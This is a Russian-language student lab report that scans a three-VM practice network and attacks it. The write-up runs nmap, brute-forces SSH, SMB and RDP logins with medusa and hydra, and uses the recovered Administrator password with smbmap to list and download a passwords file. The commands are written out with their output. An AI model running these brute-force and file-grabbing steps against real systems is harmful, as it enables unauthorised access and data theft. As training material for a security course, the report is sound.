# Сбор и аналитическая обработка информации о сетевом трафике
Александр Смирнов

# Ход выполнения практической работы

## Создание виртуальных машин

Был создан стенд из трёх виртуальных машин. Проверим открытые порты
виртуальных машин:

``` bash
nmap -P 192.168.137.1/24
```

    Warning:  You are not root -- using TCP pingscan rather than ICMP
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-06 17:24 MSK
    Nmap scan report for C239U59.mshome.net (192.168.137.1)
    Host is up (0.0088s latency).
    Not shown: 997 closed tcp ports (conn-refused)
    PORT    STATE SERVICE
    135/tcp open  msrpc
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds

    Nmap scan report for CEH-7.mshome.net (192.168.137.4)
    Host is up (0.016s latency).
    Not shown: 987 closed tcp ports (conn-refused)
    PORT      STATE SERVICE
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    554/tcp   open  rtsp
    2869/tcp  open  icslap
    3389/tcp  open  ms-wbt-server
    10243/tcp open  unknown
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49156/tcp open  unknown
    49157/tcp open  unknown

    Nmap scan report for MikroTik.mshome.net (192.168.137.106)
    Host is up (0.0015s latency).
    Not shown: 994 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    21/tcp   open  ftp
    22/tcp   open  ssh
    23/tcp   open  telnet
    80/tcp   open  http
    2000/tcp open  cisco-sccp
    8291/tcp open  unknown

    Nmap scan report for X555LJ.mshome.net (192.168.137.130)
    Host is up (0.00068s latency).
    Not shown: 997 closed tcp ports (conn-refused)
    PORT    STATE SERVICE
    25/tcp  open  smtp
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds

    Nmap done: 256 IP addresses (4 hosts up) scanned in 140.06 seconds

Где CEH-7 - ВМ с Windows7, X55LJ - ВМ с Kali Linux, Mikrotik - роутер с
RouterOS.

## Атака Bruteforce

### На роутер Mikrotik

``` bash
medusa -M ssh -U users.txt -P pass.txt -h 192.168.137.106 | grep 'ACCOUNT FOUND'
```

    ACCOUNT FOUND: [ssh] Host: 192.168.137.106 User: mirea Password: mirea [SUCCESS]

### На ОС Windows

#### SMB

``` bash
medusa -M smbnt -U users.txt -P pass.txt -h 192.168.137.4 | grep 'ACCOUNT FOUND'
```

    ACCOUNT FOUND: [smbnt] Host: 192.168.137.4 User: Administrator Password: qwerty1505 [SUCCESS (ADMIN$ - Access Allowed)]
    ACCOUNT FOUND: [smbnt] Host: 192.168.137.4 User: 1 Password: 1 [SUCCESS (ADMIN$ - Access Denied)]

#### RDP

``` bash
hydra -L users.txt -P pass.txt rdp://192.168.137.4
```

    Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-06 17:26:53
    [WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
    [INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
    [WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 20 login tries (l:4/p:5), ~5 tries per task
    [DATA] attacking rdp://192.168.137.4:3389/
    [3389][rdp] host: 192.168.137.4   login: Administrator   password: qwerty1505
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-06 17:26:56

## Использование SMBMAP

Проверим права:

``` bash
smbmap -u Administrator -p qwerty1505 -d workgroup -H 192.168.137.4
```

    [\] Working on it...
    [+] IP: 192.168.137.4:445   Name: CEH-7.mshome.net                                  
    [|] Working on it...
    [/] Working on it...
    [-] Working on it...
    [\] Working on it...
    [|] Working on it...
    [/] Working on it...
    [-] Working on it...
    [\] Working on it...
    [|] Working on it...
    [/] Working on it...
    [-] Working on it...
    [\] Working on it...
    [|] Working on it...
    [/] Working on it...
    [-] Working on it...
                                    
        Disk                                                    Permissions Comment
        ----                                                    ----------- -------
        ADMIN$                                              READ, WRITE Remote Admin
        C$                                                  READ, WRITE Default share
        IPC$                                                NO ACCESS   Remote IPC
        Users                                               READ, WRITE 

Проверим содержимое рабочего стола:

``` bash
smbmap -u Administrator -p qwerty1505 -d workgroup -H 192.168.137.4 -r 'C$\Users\Administrator\Desktop'
```

    [\] Working on it...
    [+] IP: 192.168.137.4:445   Name: CEH-7.mshome.net                                  
    [|] Working on it...
    [/] Working on it...
    [-] Working on it...
    [\] Working on it...
    [|] Working on it...
    [/] Working on it...
    [-] Working on it...
                                    
        Disk                                                    Permissions Comment
        ----                                                    ----------- -------
        C$                                                  READ, WRITE 
        .\C$Users\Administrator\Desktop\*
        dw--w--w--                0 Thu Apr  6 17:21:54 2023    .
        dw--w--w--                0 Thu Apr  6 17:21:54 2023    ..
        fr--r--r--              282 Wed Feb  1 14:57:12 2012    desktop.ini
        fr--r--r--               28 Thu Apr  6 17:21:54 2023    passwords.txt

Получим интересующий нас файл:

``` bash
smbmap -u Administrator -p qwerty1505 -d workgroup -H 192.168.137.4 -r  --download 'C$\Users\Administrator\Desktop\passwords.txt'
```

    [\] Working on it...
    [|] Working on it...
    [+] Starting download: C$\Users\Administrator\Desktop\passwords.txt (28 bytes)
    [+] File output to: /home/olekzonder/Код/UIBIAS/192.168.137.4-C_Users_Administrator_Desktop_passwords.txt
    [/] Working on it...
    [-] Working on it...
    [\] Working on it...
    [|] Working on it...
    [/] Working on it...
    [-] Working on it...
                                    

Прочитаем содержимое файла:

``` bash
cat 192.168.137.4-C_Users_Administrator_Desktop_passwords.txt 
```

    Sanya pro hacker
    bruh
    BRUH
